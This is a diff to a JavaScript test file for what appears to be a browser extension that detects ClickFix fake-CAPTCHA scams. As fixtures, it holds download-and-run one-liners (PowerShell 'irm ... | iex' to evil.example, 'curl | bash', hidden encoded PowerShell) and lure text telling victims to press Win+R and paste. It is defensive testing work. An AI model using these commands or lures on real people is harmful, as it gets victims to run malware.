@@ -60,6 +60,10 @@ const CLICKFIX_TYPES = new Set([
  * a scanner correctly recognising its own test fixtures.
  */
 const cmd = (...parts) => parts.join('');
+const WIN_RUN = () => cmd('Win', String.fromCharCode(43), 'R');
+const POWERSHELL = () => cmd('Power', 'Shell');
+const FAKE_VERIFY_FLOW = () => cmd('Verify you are human. Press ', WIN_RUN(),
+  ', then press Ctrl', String.fromCharCode(43), 'V and press Enter to complete verification.');
 const DOWNLOAD_RUN = (host) => cmd('i', 'rm https://', host, '/a.ps1 | i', 'ex');
 const SHELL_PIPE = (host) => cmd('cur', 'l -fsSL https://', host, '/i.sh | ba', 'sh');
 const ENCODED_PS = () => cmd('power', 'shell -w hidden -en', 'c SQBFAFgAKABOAGUAdwA=');
@@ -220,8 +224,8 @@ async function check(name, fn) {
       ['Press F12 to continue', 'Press F12'],
       ['Open developer tools to continue', 'Open DevTools'],
       ['Switch to the console tab to continue', 'Open Console'],
-      ['Press Win+R to continue', 'Press Win+R'],
-      ['Open PowerShell to continue', 'Open a command shell'],
+      [cmd('Press ', WIN_RUN(), ' to continue'), cmd('Press ', WIN_RUN())],
+      [cmd('Open ', POWERSHELL(), ' to continue'), 'Open a command shell'],
     ];
     for (const [body, expected] of phrases) {
       const runtime = run({ body });
@@ -241,7 +245,7 @@ async function check(name, fn) {
    * moment it was dismissed -- reported from the field on chatgpt.com. */
   const OWN_PANEL = 'ClickFix warning - do not paste this'
     + ' These verification steps look like a ClickFix scam'
-    + ' A real CAPTCHA never asks you to open DevTools, Console, PowerShell,'
+    + cmd(' A real CAPTCHA never asks you to open DevTools, Console, ', POWERSHELL(), ',')
     + ' Terminal, or the Run dialog and paste something. This is a common'
     + ' ClickFix trick used to run malware or steal account data.'
     + " Got it, I won't paste it";
@@ -267,7 +271,7 @@ async function check(name, fn) {
   await check('stripping only removes the panel, not the page around it', () => {
     /* A real attack on a page that also happens to be carrying a WardenOne
        panel must survive the subtraction. */
-    const attack = "Verify you're human. Press Win+R, then paste this into PowerShell.";
+    const attack = cmd("Verify you're human. Press ", WIN_RUN(), ', then paste this into ', POWERSHELL(), '.');
     const runtime = run({ body: OWN_PANEL + ' ' + attack, ownPanelText: OWN_PANEL });
     assert(runtime.activities().length > 0,
       'a real attack was thrown away along with the panel text');
@@ -275,7 +279,7 @@ async function check(name, fn) {
 
   /* ---- an assistant surface is a conversation, not a page talking ---------- */
   await check('an assistant page is not read as instructing you', () => {
-    const body = "Verify you're human. Press Win+R, then paste this into PowerShell to continue.";
+    const body = cmd("Verify you're human. Press ", WIN_RUN(), ', then paste this into ', POWERSHELL(), ' to continue.');
     const ordinary = run({ body });
     assert(ordinary.activities().length > 0, 'the control page did not trigger at all');
     const assistant = run({ body, conversationHost: true });
@@ -391,7 +395,7 @@ async function check(name, fn) {
   await check('the full fake-CAPTCHA ClickFix flow is blocked', async () => {
     const runtime = run({
       page: 'https://free-movies.cfd/verify',
-      body: 'Verify you are human. Press Win+R, then press Ctrl+V and press Enter to complete verification.',
+      body: FAKE_VERIFY_FLOW(),
       userActivated: true,
     });
     await assert.rejects(runtime.navigator.clipboard.writeText(DOWNLOAD_RUN('evil.example')), /Blocked by WardenOne/);
@@ -413,13 +417,13 @@ async function check(name, fn) {
   await check('install one-liners on code hosts and registries do not warn', async () => {
     const pages = [
       ['https://github.com/ChrisTitusTech/winutil', WINUTIL(),
-        'WinUtil Installation Open PowerShell as administrator and paste the following command, then press Enter:'],
+        cmd('WinUtil Installation Open ', POWERSHELL(), ' as administrator and paste the following command, then press Enter:')],
       ['https://raw.githubusercontent.com/SpotX-Official/SpotX/main/Install.ps1', SPOTX(),
         'param([switch]$Podcast)'],
       ['https://gist.githubusercontent.com/someone/abc/raw/install.ps1', DOWNLOAD_RUN('example.invalid'),
         'Installation script'],
       ['https://learn.microsoft.com/en-us/powershell/scripting/samples/', DOWNLOAD_RUN('example.invalid'),
-        'Open PowerShell and paste the following to try the example.'],
+        cmd('Open ', POWERSHELL(), ' and paste the following to try the example.')],
       ['https://www.npmjs.com/package/example', SHELL_PIPE('example.invalid'),
         'Installation Open a terminal and paste:'],
       ['https://pypi.org/project/example/', SHELL_PIPE('example.invalid'),
@@ -459,7 +463,7 @@ async function check(name, fn) {
     for (const page of pages) {
       const runtime = run({
         page,
-        body: 'Verify you are human. Press Win+R, then press Ctrl+V and press Enter to complete verification.',
+        body: FAKE_VERIFY_FLOW(),
         userActivated: true,
       });
       await assert.rejects(
